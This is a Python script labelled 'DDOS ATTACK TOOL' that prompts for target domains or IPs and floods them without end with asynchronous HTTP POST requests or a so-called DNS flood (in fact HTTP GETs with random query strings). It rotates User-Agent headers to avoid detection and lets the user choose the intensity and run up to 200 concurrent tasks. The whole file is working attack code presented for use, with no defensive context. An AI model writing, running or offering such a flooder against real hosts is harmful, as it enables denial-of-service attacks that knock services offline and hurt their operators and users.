import aiohttp
import asyncio
import random
import re
import logging
import requests

# Define user agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Configure logging
LOG_FILE = "ddos_tool.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

def get_random_user_agent():
    """Returns a random User-Agent header."""
    return {"User-Agent": random.choice(USER_AGENTS)}

def verify_target(target):
    """Verify if the target is reachable."""
    print(f"Verifying target: {target}...")
    try:
        response = requests.get(target, timeout=5, headers=get_random_user_agent())
        if response.status_code == 200:
            print(f"Target {target} is reachable.")
            return True
        else:
            print(f"Target {target} returned status code {response.status_code}.")
            return False
    except Exception as e:
        print(f"Error verifying target {target}: {e}")
        return False

async def send_http_post_request(target, delay):
    """Send HTTP POST requests to the target."""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.post(target, headers=get_random_user_agent(), data={"key": "value"}) as response:
                    print(f"HTTP POST | Target: {target} | Status Code: {response.status}")
                    logging.info(f"HTTP POST | Target: {target} | Status Code: {response.status}")
            except Exception as e:
                print(f"Error with HTTP POST target {target}: {e}")
                logging.error(f"Error with HTTP POST target {target}: {e}")
            await asyncio.sleep(delay)

async def send_dns_flood(target, delay):
    """Simulate a DNS flood attack."""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # Simulate DNS request parameters
                dns_query = f"example-{random.randint(1000, 9999)}.com"
                async with session.get(target, headers=get_random_user_agent(), params={"q": dns_query}) as response:
                    print(f"DNS Flood | Target: {target} | Query: {dns_query} | Status Code: {response.status}")
                    logging.info(f"DNS Flood | Target: {target} | Query: {dns_query} | Status Code: {response.status}")
            except Exception as e:
                print(f"Error with DNS Flood target {target}: {e}")
                logging.error(f"Error with DNS Flood target {target}: {e}")
            await asyncio.sleep(delay)

async def concurrency_control(task, semaphore):
    """Control concurrency of attack tasks."""
    async with semaphore:
        await task

async def main_async(targets, delay, attack_type):
    """Launch asynchronous requests for all targets."""
    tasks = []
    semaphore = asyncio.Semaphore(200)  # Limit concurrency ( you can change according to your needs)
    for target in targets:
        if attack_type == "http_post":
            tasks.append(concurrency_control(send_http_post_request(target, delay), semaphore))
        elif attack_type == "dns_flood":
            tasks.append(concurrency_control(send_dns_flood(target, delay), semaphore))
    await asyncio.gather(*tasks)

def configure_targets():
    """Common menu for configuring single or multiple targets."""
    multiple = input("Enter 'y' for multiple targets or 'n' for a single target: ").strip().lower()
    targets = []

    if multiple == 'y':
        t_users = int(input("Enter the total number of targets: "))
        for i in range(t_users):
            target = input(f"Enter the target domain or IP address for target {i + 1}: ").strip()
            if verify_target(target):
                targets.append(target)
    else:
        target = input("Enter the domain or IP address: ").strip()
        if verify_target(target):
            targets.append(target)

    return targets

def configure_attack():
    """Menu for selecting attack type and intensity."""
    print("Select Attack Type:")
    print("1. HTTP POST Flood")
    print("2. DNS Flood")
    attack_type = int(input("Choose attack type (1/2): "))

    print("Select Intensity:")
    print("1. Low Intensity (1 request every 1 second)")
    print("2. Medium Intensity (1 request every 0.5 seconds)")
    print("3. High Intensity (1 request every 0.2 seconds)")
    mode = int(input("Choose mode (1/2/3): "))

    if mode == 1:
        delay = 1.0
    elif mode == 2:
        delay = 0.5
    elif mode == 3:
        delay = 0.2
    else:
        print("Invalid choice. Defaulting to High Intensity.")
        delay = 0.2

    if attack_type == 1:
        attack = "http_post"
    elif attack_type == 2:
        attack = "dns_flood"
    else:
        print("Invalid attack type. Exiting...")
        exit()

    return attack, delay

if __name__ == "__main__":
    print("\t -- DDOS ATTACK TOOL -- \n")
    targets = configure_targets()

    if targets:
        attack, delay = configure_attack()
        print("Starting attack...")
        asyncio.run(main_async(targets, delay, attack))
    else:
        print("No valid targets to attack.")
